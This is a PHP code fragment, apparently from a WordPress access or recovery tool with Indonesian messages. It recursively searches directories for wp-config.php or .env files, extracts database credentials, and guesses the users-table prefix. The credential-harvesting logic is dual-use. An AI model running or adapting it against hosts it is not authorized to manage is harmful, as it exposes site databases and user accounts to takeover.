function ba_scan_for_config($dir, $depth, $maxdepth)
{
    if ($depth > $maxdepth || !is_dir($dir) || !is_readable($dir)) {
        return '';
    }
    $hit = ba_try_config_at($dir);
    if ($hit !== '') {
        return $hit;
    }
    $items = @scandir($dir);
    if (!$items) {
        return '';
    }
    $skip = array('node_modules', 'vendor', 'cache', 'backup', 'backups', 'uploads', 'upgrade');
    $i = 0;
    $n = count($items);
    for ($i = 0; $i < $n; $i++) {
        $item = $items[$i];
        if ($item === '.' || $item === '..' || $item[0] === '.') {
            continue;
        }
        if (in_array(strtolower($item), $skip, true)) {
            continue;
        }
        $full = $dir . '/' . $item;
        if (!is_dir($full)) {
            continue;
        }
        $hit = ba_scan_for_config($full, $depth + 1, $maxdepth);
        if ($hit !== '') {
            return $hit;
        }
    }
    return '';
}

function ba_scan_for_wp_root($dir, $depth, $maxdepth)
{
    if ($depth > $maxdepth || !is_dir($dir) || !is_readable($dir)) {
        return '';
    }
    if (ba_is_wp_root($dir)) {
        $rp = @realpath($dir);
        return $rp ? $rp : $dir;
    }
    $items = @scandir($dir);
    if (!$items) {
        return '';
    }
    $skip = array('node_modules', 'vendor', 'cache', 'backup', 'backups', 'uploads', 'upgrade');
    $i = 0;
    $n = count($items);
    for ($i = 0; $i < $n; $i++) {
        $item = $items[$i];
        if ($item === '.' || $item === '..' || $item[0] === '.') {
            continue;
        }
        if (in_array(strtolower($item), $skip, true)) {
            continue;
        }
        $full = $dir . '/' . $item;
        if (!is_dir($full)) {
            continue;
        }
        $hit = ba_scan_for_wp_root($full, $depth + 1, $maxdepth);
        if ($hit !== '') {
            return $hit;
        }
    }
    return '';
}

function ba_find_base($manual = '')
{
    $manual = trim((string) $manual);
    if ($manual !== '') {
        $candidates = array($manual);
        if ($manual[0] !== '/' && $manual[0] !== '\\') {
            $candidates[] = dirname(__FILE__) . '/' . $manual;
            $candidates[] = dirname(__FILE__) . '/../' . $manual;
            $candidates[] = dirname(__FILE__) . '/../../' . $manual;
        }
        $i = 0;
        $cn = count($candidates);
        for ($i = 0; $i < $cn; $i++) {
            $hit = ba_try_config_at($candidates[$i]);
            if ($hit !== '') {
                return $hit;
            }
            $hit = ba_try_config_at(rtrim($candidates[$i], '/') . '/wp-config.php');
            if ($hit !== '') {
                return $hit;
            }
            $hit = ba_try_config_at(rtrim($candidates[$i], '/') . '/wp-load.php');
            if ($hit !== '') {
                return $hit;
            }
        }
    }

    $anchors = ba_collect_anchors();
    $rels = ba_rel_config_paths();
    $roots = ba_rel_wp_root_paths();
    $i = 0;
    $an = count($anchors);
    for ($i = 0; $i < $an; $i++) {
        $base = $anchors[$i];
        $j = 0;
        $rn = count($rels);
        for ($j = 0; $j < $rn; $j++) {
            $hit = ba_try_config_at($base . '/' . $rels[$j]);
            if ($hit !== '') {
                return $hit;
            }
        }
        $j = 0;
        $rnn = count($roots);
        for ($j = 0; $j < $rnn; $j++) {
            $hit = ba_try_config_at($base . '/' . $roots[$j]);
            if ($hit !== '') {
                return $hit;
            }
        }
        $hit = ba_scan_for_config($base, 0, 4);
        if ($hit !== '') {
            return $hit;
        }
        $hit = ba_scan_for_wp_root($base, 0, 3);
        if ($hit !== '') {
            return $hit;
        }
    }
    return '';
}

function ba_cfg_get($key, $txt)
{
    $patterns = array(
        "/define\s*\(\s*['\"]" . preg_quote($key, '/') . "['\"]\s*,\s*['\"]([^'\"]*)['\"]\s*\)/",
        "/define\s*\(\s*['\"]" . preg_quote($key, '/') . "['\"]\s*,\s*([^)\s]+)\s*\)/",
    );
    $i = 0;
    $pn = count($patterns);
    for ($i = 0; $i < $pn; $i++) {
        if (preg_match($patterns[$i], $txt, $m)) {
            return trim($m[1], " \t\n\r\0\x0B'\"");
        }
    }
    if (preg_match("/getenv\s*\(\s*['\"]" . preg_quote($key, '/') . "['\"]\s*\)/", $txt)) {
        $val = getenv($key);
        if ($val !== false && $val !== '') {
            return $val;
        }
    }
    return '';
}

function ba_parse_wpconfig($base)
{
    $file = ba_locate_config_file($base);
    if ($file !== '' && substr($file, -4) === '.env') {
        return ba_parse_env_file($file);
    }
    if ($file === '' || !is_readable($file)) {
        $fake = ba_fake_wpconfig_path($base);
        if ($fake !== '') {
            return array(
                'ok'          => false,
                'msg'         => 'wp-config.php PALSU (HTML/maintenance, bukan config WordPress). Cari file backup (wp-config.php.bak) atau isi kredensial DB manual di form bawah.',
                'fake_config' => $fake,
            );
        }
        return array('ok' => false, 'msg' => 'Config WordPress asli tidak ditemukan dari ' . $base . '. Isi kredensial DB manual.');
    }
    $txt = file_get_contents($file);
    $parsed = ba_parse_db_fields($txt);
    $db = $parsed['db'];
    $prefix = $parsed['prefix'];
    if ($db['user'] === '' || $db['name'] === '' || ba_is_unresolved_var($db['user']) || ba_is_unresolved_var($db['name'])) {
        return array('ok' => false, 'msg' => 'Gagal parse DB_* dari ' . $file);
    }
    return array('ok' => true, 'db' => $db, 'prefix' => $prefix, 'config_file' => $file);
}

function ba_guess_prefix($mysqli)
{
    $rs = @$mysqli->query("SHOW TABLES LIKE '%users'");
    if (!$rs) {
        return 'wp_';
    }
    $best = '';
    while ($row = $rs->fetch_array()) {
        $tbl = $row[0];
        if (preg_match('/^(.+)users$/', $tbl, $m)) {
            $pref = $m[1];
            if ($best === '' || $pref === 'wp_') {
                $best = $pref;
            }
        }
    }
    return $best !== '' ? $best : 'wp_';
}

